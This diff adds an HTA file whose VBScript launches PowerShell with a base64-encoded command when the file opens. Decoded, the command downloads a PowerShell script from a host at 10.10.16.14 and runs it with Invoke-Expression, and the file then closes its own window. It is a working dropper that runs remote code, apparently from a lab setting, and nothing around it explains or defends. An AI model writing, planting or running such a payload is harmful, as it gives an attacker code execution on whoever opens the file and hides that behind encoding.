@@ -1,0 +1,11 @@
+<script language="VBScript">
+  Function DoStuff()
+    Dim wsh
+    Set wsh = CreateObject("Wscript.Shell")
+    wsh.run "powershell.exe -enc aQBlAHgAIAAoACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAEQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADAALgAxADAALgAxADYALgAxADQAOgA0ADQAMwAvAEkAbgB2AG8AawBlAC0AaABpAGQAZABlAG4AdABlAHMAdABhAHUAdABvAHIAZQBmADMAMgAuAHAAcwAxACcAKQApAA=="
+    Set wsh = Nothing
+  End Function
+
+  DoStuff
+  self.close
+</script>
